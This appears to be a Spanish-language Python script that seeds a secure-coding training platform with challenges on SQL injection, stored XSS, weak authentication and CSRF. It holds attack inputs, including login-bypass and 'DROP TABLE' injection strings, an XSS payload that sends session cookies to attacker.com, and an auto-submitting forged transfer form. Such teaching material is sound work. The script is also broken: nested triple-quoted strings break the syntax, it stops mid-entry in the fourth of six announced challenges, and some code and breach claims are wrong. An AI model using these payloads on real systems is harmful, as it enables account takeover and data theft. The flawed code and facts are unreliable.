"""
Script para cargar los 6 desafíos educativos de Secure Coding Dojo
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from sqlalchemy.orm import Session
from app.db.session import SessionLocal
from app.models.challenge import Challenge, DifficultyLevel, VulnerabilityType, AttackType
from datetime import datetime

CHALLENGES = [
    {
        "title": "SQL Injection - Login Bypass",
        "short_title": "SQL Injection",
        "description": "Aprende cómo los ataques de SQL Injection pueden comprometer bases de datos. Este ejercicio te enseña a identificar y explotar vulnerabilidades en consultas SQL.",
        "difficulty": DifficultyLevel.BEGINNER,
        "vulnerability_type": VulnerabilityType.SQL_INJECTION,
        "attack_type": AttackType.INJECTION,
        "icon": "💉",
        "color": "red",
        "difficulty_order": 1,
        "cvss_score": 9.8,
        "owasp_top_10": "A03:2021",
        "cwe_id": "CWE-89",
        "cwe_description": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        
        "vulnerability_explanation": """
SQL Injection ocurre cuando un atacante inserta código SQL malicioso en campos de entrada que no son 
validados adecuadamente. Esto permite al atacante:

1. **Acceso no autorizado**: Bypasear autenticación
2. **Exposición de datos**: Leer información sensible de la BD
3. **Modificación de datos**: Alterar registros
4. **Eliminación de datos**: Borrar tablas completas
5. **Escalada de privilegios**: Obtener permisos administrativos

La raíz del problema es concatenar entradas del usuario directamente en consultas SQL sin validación.
        """,
        
        "attack_explanation": """
Un atacante típicamente usa estas técnicas:

**Login Bypass**: En lugar de escribir usuario y contraseña legítimos, el atacante escribe:
- Usuario: admin' --
- Contraseña: cualquier cosa

La consulta SQL se convierte en: 
SELECT * FROM users WHERE email='admin' --' AND password='...'

El -- comenta el resto de la consulta, haciendo que solo valide si existe el email 'admin'.

**Extracción de datos**: 
- admin' UNION SELECT username, password FROM admin_users --
- Este comando extrae datos sensibles

**Modificación maliciosa**:
- admin'; DROP TABLE users; --
- Elimina la tabla completa
        """,
        
        "real_world_impact": """
Los ataques de SQL Injection han causado:
- **Yahoo (2013)**: 3 billones de cuentas comprometidas
- **LinkedIn (2012)**: 6.5 millones de contraseñas robadas
- **TalkTalk (2015)**: 157,000 clientes afectados, £80 millones en multas

Impacto empresarial:
- Pérdida de confianza del cliente
- Multas regulatorias (GDPR, HIPAA)
- Costo de remediación: $5+ millones
- Robo de propiedad intelectual
        """,
        
        "countermeasures": """
Las mejores prácticas para prevenir SQL Injection:

1. **Prepared Statements / Parameterized Queries**: Separar código SQL de datos
2. **ORM (Object-Relational Mapping)**: Usar ORMs como SQLAlchemy, Hibernate
3. **Input Validation**: Validar tipos, longitud y patrones
4. **Whitelist Validation**: Solo permitir valores conocidos
5. **Escaping**: Escapar caracteres especiales
6. **Least Privilege**: BD con usuario con mínimos permisos
7. **Web Application Firewall (WAF)**: Detectar patrones de ataques
8. **Code Review**: Auditar consultas SQL manualmente
        """,
        
        "best_practices": """
Implementar seguridad en la programación:

✓ Siempre usar prepared statements
✓ Nunca confiar en entrada del usuario
✓ Implementar rate limiting
✓ Usar stored procedures con parámetros
✓ Validar entrada en servidor, no solo cliente
✓ Usar ORM que escapa automáticamente
✓ Implementar logging y monitoreo
✓ Realizar pruebas de seguridad regularmente (SAST/DAST)
✓ Mantener dependencias actualizadas
✓ Usar variables de ambiente para credenciales
        """,
        
        "learning_objectives": """
Al completar este desafío, aprenderás:
- Identificar vulnerabilidades de SQL Injection
- Comprender el ciclo de vida de un ataque
- Implementar prepared statements correctamente
- Validar entrada de usuario efectivamente
- Configurar permisos mínimos en bases de datos
- Implementar WAF rules
- Realizar code reviews de seguridad
        """,
        
        "references": """
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- PortSwigger SQL Injection: https://portswigger.net/web-security/sql-injection
- SANS Top 25: https://www.sans.org/top25-software-errors/
        """,
        
        "vulnerable_code": """
// ❌ CÓDIGO VULNERABLE
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    email = request.json.get('email')
    password = request.json.get('password')
    
    # ⚠️ PELIGRO: Concatenación directa de entrada del usuario
    query = f"SELECT * FROM users WHERE email='{email}' AND password='{password}'"
    
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()
    cursor.execute(query)  # SQL Injection aquí
    user = cursor.fetchone()
    
    if user:
        return jsonify({"status": "success", "user": user})
    else:
        return jsonify({"status": "failed"}), 401
        """,
        
        "vulnerable_code_language": "python",
        
        "vulnerable_code_explanation": """
El código es vulnerable porque:
1. Concatena directamente las variables email y password en la consulta SQL
2. No valida ni escapa caracteres especiales
3. No usa prepared statements
4. Un atacante puede escribir: admin' -- para bypassear autenticación
        """,
        
        "secure_code": """
// ✅ CÓDIGO SEGURO
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    email = request.json.get('email')
    password = request.json.get('password')
    
    # ✓ Validación de entrada
    if not email or not password:
        return jsonify({"status": "error", "message": "Email and password required"}), 400
    
    if not email or '@' not in email or len(email) > 255:
        return jsonify({"status": "error", "message": "Invalid email format"}), 400
    
    # ✓ Prepared Statement - Los ? son placeholders
    query = "SELECT id, email, name FROM users WHERE email=? AND password=?"
    
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()
    
    # ✓ Pasar parámetros separadamente - SQL Injection imposible
    cursor.execute(query, (email, password))
    user = cursor.fetchone()
    
    if user:
        return jsonify({"status": "success", "user_id": user[0]})
    else:
        return jsonify({"status": "failed", "message": "Invalid credentials"}), 401
        """,
        
        "secure_code_language": "python",
        
        "secure_code_explanation": """
El código es seguro porque:
1. Usa prepared statements con ? como placeholders
2. Parámetros se envían separadamente, nunca se concatenan
3. Valida formato de email antes de usar
4. Devuelve solo información necesaria (sin password)
5. Usa conexión segura a BD
        """,
        
        "hint_1": """
Pista 1: El problema está en cómo se construye la consulta SQL. 
¿Cómo se podría usar un carácter especial como apostrof (') para salir del string 
y manipular la lógica de la consulta?
        """,
        
        "hint_2": """
Pista 2: Piensa en cómo un atacante podría terminar el string email y agregar más lógica SQL.
Por ejemplo: admin' AND 1=1 --
¿Qué sucede si cambias las comillas y los comentarios (--)?
        """,
        
        "hint_3": """
Pista 3: La solución es usar prepared statements (parameterized queries).
En lugar de concatenar variables, usa placeholders como ? o :param_name
que el driver SQL rellena automáticamente.
        """,
        
        "test_endpoint": "/login",
        "test_payload": '{"email": "admin\' --", "password": "anything"}',
        "expected_result": "Success (SQL Injection executes)"
    },
    
    {
        "title": "Cross-Site Scripting (XSS) - Stored Attack",
        "short_title": "Cross-Site Scripting (XSS)",
        "description": "Descubre cómo los atacantes inyectan scripts maliciosos que se ejecutan en navegadores de otros usuarios. Aprende a prevenir Stored XSS.",
        "difficulty": DifficultyLevel.BEGINNER,
        "vulnerability_type": VulnerabilityType.XSS,
        "attack_type": AttackType.CROSS_SITE,
        "icon": "🔤",
        "color": "orange",
        "difficulty_order": 2,
        "cvss_score": 6.1,
        "owasp_top_10": "A03:2021",
        "cwe_id": "CWE-79",
        "cwe_description": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
        
        "vulnerability_explanation": """
Cross-Site Scripting (XSS) es una vulnerabilidad que permite a los atacantes inyectar código JavaScript 
malicioso en páginas web que se ejecuta en navegadores de otros usuarios.

Existen tres tipos principales:

1. **Stored XSS** (Persistente): El código se almacena en BD y se ejecuta siempre
2. **Reflected XSS**: Se refleja en respuestas HTTP, requiere que el usuario haga clic
3. **DOM-based XSS**: Manipulación del DOM del lado del cliente

La raíz: No sanitizar datos antes de mostrarlos en HTML
        """,
        
        "attack_explanation": """
Ejemplo de ataque Stored XSS en comentarios:

1. Atacante escribe comentario: 
   <img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">

2. El comentario se guarda en BD SIN validar

3. Cuando otros usuarios ven el comentario, el navegador ejecuta el JavaScript

4. El script roba sus cookies de sesión y las envía al atacante

5. Atacante usa la cookie robada para hacerse pasar por la víctima

Similar con:
- <script>alert('XSS')</script>
- <svg onload="fetch(...)">
- <iframe src="javascript:alert('XSS')">
- Event handlers: onclick, onmouseover, onload
        """,
        
        "real_world_impact": """
Ataques XSS conocidos:
- **Facebook (2013)**: Robo de sesiones de 2.7M usuarios
- **Yahoo Mail (2013)**: Acceso a cuentas mediante XSS persistente
- **Gmail (múltiples)**: Phishing mediante iframes inyectados
- **eBay**: Robo de credenciales via XSS

Impacto:
- Robo de cookies/sesiones
- Phishing y suplantación
- Malware y troyanos
- Keylogging
- Defacement
- Redirección a sitios maliciosos
        """,
        
        "countermeasures": """
Prevención de XSS:

1. **Output Encoding/Escaping**: Convertir caracteres especiales HTML
   - < a &lt;
   - > a &gt;
   - " a &quot;
   - & a &amp;

2. **Input Validation**: Validar datos en entrada
3. **Content Security Policy (CSP)**: Headers que controlan recursos
4. **Sanitization**: Limpiar HTML peligroso (usar librerías como DOMPurify)
5. **HTTPOnly Cookies**: Cookies no accesibles vía JavaScript
6. **X-XSS-Protection Header**: Activar protección XSS del navegador
7. **Template Engines**: Angular, React escapan automáticamente por defecto
8. **Security Headers**: X-Content-Type-Options: nosniff
        """,
        
        "best_practices": """
✓ Siempre escapar datos antes de renderizar en HTML
✓ Usar frameworks modernos que escapan por defecto (React, Vue, Angular)
✓ Implementar Content Security Policy (CSP)
✓ Usar bibliotecas de sanitización
✓ Validar en servidor, nunca confiar en cliente
✓ HTTPOnly y Secure en cookies
✓ No usar innerHTML, usar textContent o innerText
✓ Implementar CSP con nonce para scripts
✓ Realizar security testing (OWASP ZAP, Burp)
✓ Educar al equipo sobre riesgos de XSS
        """,
        
        "learning_objectives": """
Aprenderás:
- Tipos de XSS: Stored, Reflected, DOM-based
- Cómo se ejecuta el ataque
- Impacto de robo de sesiones
- Escapar HTML correctamente
- Implementar CSP
- Sanitizar HTML peligroso
- Testing de XSS
        """,
        
        "references": """
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting
- OWASP CSP: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
        """,
        
        "vulnerable_code": """
// ❌ CÓDIGO VULNERABLE - React sin escapar
import React, { useState } from 'react';

export default function Comments() {
  const [comment, setComment] = useState("");
  const [comments, setComments] = useState([]);
  
  const handleSubmit = (e) => {
    e.preventDefault();
    setComments([...comments, comment]);
    setComment("");
  };
  
  return (
    <div>
      <form onSubmit={handleSubmit}>
        <input 
          value={comment}
          onChange={(e) => setComment(e.target.value)}
          placeholder="Escribe un comentario"
        />
        <button>Enviar</button>
      </form>
      
      {/* ⚠️ PELIGRO: dangerouslySetInnerHTML ejecuta HTML/JavaScript */}
      <div className="comments-list">
        {comments.map((c, i) => (
          <div key={i} dangerouslySetInnerHTML={{ __html: c }} />
        ))}
      </div>
    </div>
  );
}
        """,
        
        "vulnerable_code_language": "javascript",
        
        "vulnerable_code_explanation": """
El código es vulnerable porque:
1. Usa dangerouslySetInnerHTML que ejecuta HTML/JavaScript
2. Un atacante puede inyectar: <img src=x onerror="alert('XSS')">
3. El script se ejecuta cuando otros ven el comentario
4. Podría robar cookies: fetch('http://attacker.com/steal?c='+document.cookie)
        """,
        
        "secure_code": """
// ✅ CÓDIGO SEGURO - React con escaping automático
import React, { useState } from 'react';
import DOMPurify from 'dompurify';

export default function Comments() {
  const [comment, setComment] = useState("");
  const [comments, setComments] = useState([]);
  
  // Validación de entrada
  const isValidComment = (text) => {
    if (!text || text.trim().length === 0) return false;
    if (text.length > 1000) return false;
    return true;
  };
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    if (!isValidComment(comment)) {
      alert("Comentario inválido");
      return;
    }
    
    setComments([...comments, comment]);
    setComment("");
  };
  
  return (
    <div>
      <form onSubmit={handleSubmit}>
        <input 
          value={comment}
          onChange={(e) => setComment(e.target.value)}
          placeholder="Escribe un comentario"
          maxLength="1000"
        />
        <button>Enviar</button>
      </form>
      
      {/* ✓ React escapa automáticamente - es seguro */}
      <div className="comments-list">
        {comments.map((c, i) => (
          <div key={i} className="comment">
            {/* Renderización de texto sin HTML */}
            {c}
          </div>
        ))}
      </div>
    </div>
  );
}
        """,
        
        "secure_code_language": "javascript",
        
        "secure_code_explanation": """
El código es seguro porque:
1. React escapa automáticamente el contenido (no ejecuta HTML)
2. Validación de entrada: no nulo, máximo 1000 caracteres
3. No usa dangerouslySetInnerHTML
4. maxLength en input previene entrada excesivamente larga
5. Si necesitara HTML, usaría DOMPurify para sanitizar
        """,
        
        "hint_1": """
Pista 1: El problema está en cómo se renderiza el comentario.
¿Qué significa dangerouslySetInnerHTML y por qué es peligroso?
        """,
        
        "hint_2": """
Pista 2: Un atacante podría escribir en el comentario:
<img src=x onerror="console.log('XSS')">

¿Qué sucedería si renderizas esto con dangerouslySetInnerHTML?
        """,
        
        "hint_3": """
Pista 3: La solución es simple - deja que React escape el HTML automáticamente.
No uses dangerouslySetInnerHTML a menos que sea absolutamente necesario,
y en ese caso, usa librerías como DOMPurify para sanitizar primero.
        """,
        
        "test_endpoint": "/comments",
        "test_payload": '{"comment": "<img src=x onerror=\"alert(\'XSS\')\">"}',
        "expected_result": "Alert executes (XSS vulnerability)"
    },
    
    {
        "title": "Broken Authentication - Weak Credentials",
        "short_title": "Broken Authentication",
        "description": "Descubre cómo fallos en autenticación permiten acceso no autorizado. Aprende sobre contraseñas débiles, hashing inseguro y sesiones.",
        "difficulty": DifficultyLevel.INTERMEDIATE,
        "vulnerability_type": VulnerabilityType.BROKEN_AUTH,
        "attack_type": AttackType.AUTHENTICATION,
        "icon": "🔑",
        "color": "yellow",
        "difficulty_order": 3,
        "cvss_score": 9.1,
        "owasp_top_10": "A07:2021",
        "cwe_id": "CWE-287",
        "cwe_description": "Improper Authentication",
        
        "vulnerability_explanation": """
Broken Authentication ocurre cuando mecanismos de autenticación no funcionan correctamente,
permitiendo a atacantes:

1. **Acceso con credenciales débiles**: Usuarios con contraseñas simples
2. **Hashing inseguro**: Contraseñas sin sal o con algoritmos débiles
3. **Gestión de sesiones fallida**: Tokens predecibles, sin expiración
4. **Credential stuffing**: Reutilizar credenciales de brechas anteriores
5. **Default credentials**: Usuarios y contraseñas por defecto nunca cambiadas
6. **Falta de MFA**: Sin autenticación multifactor

La raíz: Implementación deficiente de autenticación
        """,
        
        "attack_explanation": """
Atacante típico:

1. **Fuerza bruta**: admin/admin, admin/123456, admin/password
   - 10,000 intentos/segundo es fácil para computadoras
   - Contraseña débil se crackea en segundos

2. **Diccionario de brechas anteriores**: 
   - Bases de datos públicas de leaks (rockyou.txt, etc.)
   - Prueba correos + contraseñas robadas

3. **Hashing débil**:
   - MD5: 1 millón de hashes/segundo con GPU
   - SHA1: Igual de débil
   - Sin sal: Rainbow tables rompen hashes

4. **Gestión de sesiones**:
   - Session ID predecible: admin_1, admin_2, etc.
   - Token sin expiración
   - Token almacenado en URL (logs exponen)

5. **Default credentials**:
   - router: admin/admin
   - DB: root/root
   - App: test/test

6. **Credential stuffing**:
   - 23 billones de credenciales de brechas públicas
   - Algoritmo: para cada breach, probar credenciales en otros sitios
        """,
        
        "real_world_impact": """
Brechas de autenticación conocidas:
- **LinkedIn (2012)**: 6.5M contraseñas debiles hasheadas con SHA1
- **Target (2013)**: 70M datos de clientes, acceso por FTP débil
- **Zoom (2020)**: 500K credenciales en la web
- **Twitch (2021)**: 4.7M usuarios, fallos en autenticación

Impacto:
- Acceso a cuentas de usuarios
- Robo de datos personales
- Fraude financiero
- Suplantación de identidad
- Movimiento lateral en redes
        """,
        
        "countermeasures": """
Implementar autenticación segura:

1. **Requerimientos de contraseña**:
   - Mínimo 12 caracteres
   - Mix de mayúsculas, minúsculas, números, símbolos
   - Sin información personal (nombre, email, etc.)
   - Histórico para evitar repetición

2. **Hashing seguro**:
   - bcrypt (Blowfish + salt)
   - scrypt (derivación de clave con parámetros de coste)
   - Argon2 (RECOMENDADO - ganador Password Hashing Competition)
   - PBKDF2 con 100,000+ iteraciones

3. **Gestión de sesiones**:
   - Tokens aleatorios y largos (256 bits mínimo)
   - Almacenar hash del token, no el token directo
   - Expiración de sesión (30 mins inactividad)
   - Regenerar token después de login
   - HTTPOnly, Secure, SameSite en cookies

4. **Autenticación Multifactor (MFA)**:
   - TOTP (Time-based OTP)
   - SMS (menos seguro pero mejor que nada)
   - Email verification
   - Biometría

5. **Monitoreo**:
   - Detectar intentos fallidos múltiples
   - Rate limiting
   - Bloquear por IP después de N intentos
   - Alertas de ubicación/dispositivo nuevo
        """,
        
        "best_practices": """
✓ Implementar bcrypt/Argon2 SIEMPRE
✓ Contraseñas mínimo 12 caracteres
✓ Implementar rate limiting (máx 5 intentos/5 mins)
✓ MFA obligatorio para cuentas privilegiadas
✓ Regenerar session ID después de login
✓ HTTPOnly y Secure en cookies
✓ Expiración de sesión
✓ Auditar logs de autenticación
✓ Validar nuevos dispositivos/ubicaciones
✓ Usar OAuth2/OpenID Connect para terceros
✓ Nunca mostrar si email existe/no existe
✓ Implementar "forgot password" seguro
        """,
        
        "learning_objectives": """
Aprenderás:
- Tipos de ataques de autenticación
- Hashing vs encryption vs encoding
- Algoritmos seguros de hashing
- Generación de tokens seguros
- Gestión de sesiones
- Rate limiting
- MFA y OTP
- Testing de autenticación
        """,
        
        "references": """
- OWASP Authentication: https://owasp.org/www-community/attacks/
- CWE-287: https://cwe.mitre.org/data/definitions/287.html
- NIST Password Guidelines: https://pages.nist.gov/800-63-3/
- Password Hashing: https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
        """,
        
        "vulnerable_code": """
// ❌ CÓDIGO VULNERABLE
from flask import Flask, request, jsonify
import hashlib

app = Flask(__name__)

@app.route('/register', methods=['POST'])
def register():
    username = request.json.get('username')
    password = request.json.get('password')
    
    # ⚠️ PROBLEMA 1: No valida longitud/complejidad
    if len(password) < 4:  # 4 caracteres es muy débil
        return jsonify({"error": "Password must be 4+ characters"}), 400
    
    # ⚠️ PROBLEMA 2: Usa SHA256 sin sal (inseguro)
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    
    # Guardar en BD
    user = {"username": username, "password_hash": password_hash}
    # save_to_db(user)
    
    return jsonify({"status": "registered"})

@app.route('/login', methods=['POST'])
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    
    # ⚠️ PROBLEMA 3: Sin rate limiting - vulnerable a fuerza bruta
    
    # ⚠️ PROBLEMA 4: Sin MFA
    
    # Verificar
    user = get_user_from_db(username)
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    
    if user and user['password_hash'] == password_hash:
        # ⚠️ PROBLEMA 5: Session ID predecible
        session_id = f"session_{username}_{random.randint(1, 1000)}"
        
        return jsonify({
            "status": "success", 
            "session_id": session_id  # ⚠️ En URL/logs
        })
    
    return jsonify({"status": "failed"}), 401
        """,
        
        "vulnerable_code_language": "python",
        
        "vulnerable_code_explanation": """
El código es vulnerable por:
1. Contraseña mínimo 4 caracteres (debe ser 12+)
2. Usa SHA256 sin sal (vulnerable a rainbow tables)
3. Sin rate limiting (fuerza bruta fácil)
4. Sin MFA (una sola capá de autenticación)
5. Session ID predecible (secreto débil)
6. Session ID en URL (exposed en logs/historial)
        """,
        
        "secure_code": """
// ✅ CÓDIGO SEGURO
from flask import Flask, request, jsonify, session
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import bcrypt
import secrets
import re

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)  # Clave segura

# Rate limiting
limiter = Limiter(app=app, key_func=get_remote_address)

# Validación de contraseña fuerte
def validate_password(password):
    """Valida que contraseña cumpla requisitos"""
    if len(password) < 12:
        return False, "Mínimo 12 caracteres"
    if not re.search(r'[A-Z]', password):
        return False, "Debe contener mayúsculas"
    if not re.search(r'[a-z]', password):
        return False, "Debe contener minúsculas"
    if not re.search(r'[0-9]', password):
        return False, "Debe contener números"
    if not re.search(r'[!@#$%^&*]', password):
        return False, "Debe contener símbolos"
    return True, "OK"

@app.route('/register', methods=['POST'])
def register():
    username = request.json.get('username')
    password = request.json.get('password')
    
    # ✓ Validar contraseña
    is_valid, message = validate_password(password)
    if not is_valid:
        return jsonify({"error": message}), 400
    
    # ✓ Validar username
    if len(username) < 3 or len(username) > 50:
        return jsonify({"error": "Invalid username"}), 400
    
    # ✓ Hash con bcrypt (genera salt automáticamente)
    password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
    
    user = {"username": username, "password_hash": password_hash}
    # save_to_db(user)
    
    return jsonify({"status": "registered"}), 201

@app.route('/login', methods=['POST'])
@limiter.limit("5 per 5 minutes")  # ✓ Rate limiting
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    
    user = get_user_from_db(username)
    
    if not user:
        # ✓ No revelar si usuario existe
        return jsonify({"error": "Invalid credentials"}), 401
    
    # ✓ Comparación segura
    if bcrypt.checkpw(password.encode(), user['password_hash']):
        # ✓ Generar session token seguro y largo
        session_token = secrets.token_urlsafe(32)
        session_hash = bcrypt.hashpw(session_token.encode(), bcrypt.gensalt())
        
        # ✓ Guardar hash, no el token directo
        save_session(username, session_hash)
        
        response = jsonify({"status": "success"})
        # ✓ HTTPOnly, Secure, SameSite
        response.set_cookie(
            'session_token',
            session_token,
            httponly=True,
            secure=True,
            samesite='Strict',
            max_age=1800  # ✓ Expira en 30 minutos
        )
        
        return response
    
    return jsonify({"error": "Invalid credentials"}), 401
        """,
        
        "secure_code_language": "python",
        
        "secure_code_explanation": """
El código es seguro porque:
1. Valida contraseña: 12+ chars, mayúsculas, minúsculas, números, símbolos
2. Usa bcrypt con 12 rounds (muy costoso de crackear)
3. Rate limiting: máx 5 intentos cada 5 minutos
4. No revela si usuario existe
5. Token largo y aleatorio (256 bits)
6. Almacena hash del token, no el token directo
7. Cookie con HTTPOnly, Secure, SameSite
8. Expiración de sesión (30 mins)
        """,
        
        "hint_1": """
Pista 1: ¿Cuál es el problema con usar SHA256 para contraseñas?
¿Qué es una "rainbow table" y cómo podría romper tu hash?
        """,
        
        "hint_2": """
Pista 2: Necesitas un "salt" - un valor aleatorio agregado a la contraseña antes de hashear.
Bcrypt y Argon2 generan esto automáticamente. ¿Cómo funcionan?
        """,
        
        "hint_3": """
Pista 3: Incluso con hashing seguro, necesitas prevenir fuerza bruta.
Implementa rate limiting: máximo N intentos cada M minutos.
También genera tokens largos y aleatorios para sesiones.
        """,
        
        "test_endpoint": "/login",
        "test_payload": '{"username": "admin", "password": "admin"}',
        "expected_result": "Success with weak credentials"
    },
    
    {
        "title": "Cross-Site Request Forgery (CSRF)",
        "short_title": "CSRF Attack",
        "description": "Entiende cómo los atacantes engañan a usuarios para realizar acciones no autorizadas. Aprende a proteger contra ataques CSRF.",
        "difficulty": DifficultyLevel.INTERMEDIATE,
        "vulnerability_type": VulnerabilityType.CSRF,
        "attack_type": AttackType.AUTHENTICATION,
        "icon": "🔗",
        "color": "purple",
        "difficulty_order": 4,
        "cvss_score": 8.1,
        "owasp_top_10": "A01:2021",
        "cwe_id": "CWE-352",
        "cwe_description": "Cross-Site Request Forgery (CSRF)",
        
        "vulnerability_explanation": """
CSRF (Cross-Site Request Forgery) es cuando un atacante engaña a un usuario autenticado 
para que realice una acción no deseada en un sitio donde está logueado.

Ejemplo: Estás logueado en tu banco. Visitas un sitio malicioso. El atacante hace que 
tu navegador realice una transferencia desde tu cuenta sin que lo sepas.

La raíz: La aplicación no valida que la solicitud proviene de usuario legítimo.
        """,
        
        "attack_explanation": """
Escenario típico de ataque CSRF:

1. Víctima está logueada en facebook.com (tiene sesión válida)

2. Atacante envía link malicioso a víctima: 
   https://usuario-trucos.com/buscador

3. Víctima hace clic y sin saberlo, el atacante ejecuta:
   POST /friends/add HTTP/1.1
   Host: facebook.com
   Cookie: session=valid_cookie_here
   
   attacker_id=123

4. Navegador automáticamente incluye cookies válidas

5. Facebook procesa porque parece solicitud legítima

6. El atacante se agrega como amigo sin consentimiento

Técnicas de ataque:
- <img src="https://banco.com/transfer?to=attacker&amount=1000">
- <form method="POST" action="https://banco.com/transfer">
- XMLHttpRequest (AJAX) con credenciales
- Link engañoso en email/chat

Clave: El navegador AUTOMÁTICAMENTE incluye cookies de sesión.
        """,
        
        "real_world_impact": """
Ataques CSRF conocidos:
- **YouTube (2010)**: CSRF para suscribirse a canales
- **Twitter (2010)**: Publicación de tweets automática
- **Banco Sudamericano**: Transferencias automáticas
- **eBay**: Cambio de contraseña CSRF

Impacto:
- Transferencias bancarias no autorizadas
- Cambio de contraseña/email
- Compras no deseadas
- Publicación en redes sociales
- Cambio de configuración de privacidad
        """,
        
        "countermeasures": """
Prevención de CSRF:

1. **CSRF Tokens (Recomendado)**:
   - Token único por sesión + por solicitud
   - Token almacenado en servidor (sesión)
   - Token enviado como atributo del formulario
   - Validar que tokens coincidan

2. **SameSite Cookie Attribute**:
   - SameSite=Strict: No enviar cookies en cross-site requests
   - SameSite=Lax: Solo en GET, no en POST
   - Protección nativa del navegador

3. **Double-Submit Cookies**:
   - Token en cookie + en request body
   - Validar que coincidan
   - Menos seguro que CSRF tokens

4. **Origin/Referer Headers**:
   - Validar Referer header
   - Verificar Origin header
   - Menos confiable pero ayuda

5. **Arquitectura moderna**:
   - Usar SPA (Single Page Application)
   - JWT en memoria (no cookies)
   - CORS configurado estrictamente

6. **Validación en servidor**:
   - Nunca asumir que solicitud es legítima por sesión
   - Validar intención del usuario
   - Re-autenticar para acciones críticas
        """,
        
        "best_practices": """
✓ Implementar CSRF tokens en TODOS los formularios
✓ Usar SameSite=Lax/Strict en cookies
✓ Validar Origin/Referer headers
✓ Re-autenticar para operaciones críticas
✓ Usar POST/PUT/DELETE, no GET para cambios
✓ Implementar CORS restrictivo
✓ Security headers: X-Frame-Options, CSP
✓ Educar usuarios: no hacer clic en links sospechosos
✓ Implementar timeout de sesión
✓ Usar HTTPS siempre
✓ Testing: Pruebas de CSRF en cada release
        """,
        
        "learning_objectives": """
Aprenderás:
- Cómo funcionan los ataques CSRF
- Diferencia entre autenticación y autorización
- Generación de tokens CSRF
- SameSite cookie attribute
- CORS y same-origin policy
- Testing de vulnerabilidades CSRF
        """,
        
        "references": """
- OWASP CSRF: https://owasp.org/www-community/attacks/csrf
- CWE-352: https://cwe.mitre.org/data/definitions/352.html
- PortSwigger CSRF: https://portswigger.net/web-security/csrf
- SameSite: https://web.dev/samesite-cookies-explained/
        """,
        
        "vulnerable_code": """
// ❌ CÓDIGO VULNERABLE - Flask sin CSRF protection
from flask import Flask, request, jsonify, session, render_template_string

app = Flask(__name__)
app.secret_key = "secret"

HTML_FORM = """
<form method="POST" action="/transfer">
    <input type="text" name="to_account" placeholder="Cuenta destino">
    <input type="number" name="amount" placeholder="Cantidad">
    <button>Transferir</button>
</form>
"""

@app.route('/transfer_form')
def transfer_form():
    # ⚠️ No hay token CSRF en el formulario
    return render_template_string(HTML_FORM)

@app.route('/transfer', methods=['POST'])
def transfer():
    # ⚠️ No valida token CSRF
    to_account = request.form.get('to_account')
    amount = request.form.get('amount')
    
    # Solo verifica que esté logueado (sesión)
    if 'user_id' in session:
        # Realiza transferencia sin más validación
        perform_transfer(session['user_id'], to_account, amount)
        return jsonify({"status": "success", "amount": amount})
    
    return jsonify({"error": "Not authenticated"}), 401

# Atacante crea sitio malicioso con:
ATTACKER_HTML = """
<html>
<body onload="document.forms[0].submit()">
    <form method="POST" action="https://banco.com/transfer">
        <input type="hidden" name="to_account" value="attacker_account">
        <input type="hidden" name="amount" value="10000">
    </form>
</body>
</html>
"""
        """,
        
        "vulnerable_code_language": "python",
        
        "vulnerable_code_explanation": """
El código es vulnerable porque:
1. No hay token CSRF en el formulario
2. No valida ningún token en la solicitud
3. Solo verifica que usuario esté logueado
4. Si usuario autenticado visita sitio malicioso, transferencia se realiza
5. Navegador incluye cookies de sesión automáticamente
        """,
        
        "secure_code": """
// ✅ CÓDIGO SEGURO - Flask-WTF con protección CSRF
from flask import Flask, request, jsonify, session, render_template_string
from flask_wtf import FlaskForm
from flask_wtf.csrf import CSRFProtect
from wtforms import StringField, DecimalField, SubmitField
from wtforms.validators import DataRequired, Length
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

csrf = CSRFProtect(app)

class TransferForm(FlaskForm):
    to_account = StringField('To Account', validators=[DataRequired(), Length(min=10, max=20)])
    amount = DecimalField('Amount', validators=[DataRequired()])
    submit = SubmitField('Transfer')

@app.route('/transfer_form')
def transfer_form():
    form = TransferForm()
    # ✓ Template incluye CSRF token automáticamente
    return render_template_string("""
    <form method="POST" action="/transfer">
        {{ form.hidden_tag() }}
        {{ form.to_account }}
        {{ form.amount }}
        {{ form.submit }}
    </form>
    """, form=form)

@app.route('/transfer', methods=['POST'])
@csrf.protect  # ✓ Valida CSRF token
def transfer():
    form = TransferForm()
    
    # ✓ Valida token CSRF + datos del formulario
    if not form.validate_on_submit():
        return jsonify({"error": "CSRF validation failed"}), 403
    
    to_account = form.to_account.data
    amount = form.amount.data
    
    if 'user_id' not in session:
        return jsonify({"error": "Not authenticated"}), 401
    
    # ✓ Re-autenticar para operación crítica
    if not verify_password_for_critical_action(session['user_id']):
        return jsonify({"error": "Must re-authenticate"}), 403
    
    # ✓ Audit logging
    log_transaction(session['user_id'], to_account, amount)
    
    perform_transfer(session['user_id'], to_account, amount)
    return jsonify({"status": "success", "amount": amount})

# ✓ Configurar SameSite en cookies
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True
)
        """,
        
        "secure_code_language": "python",
        
        "secure_code_explanation": """
El código es seguro porque:
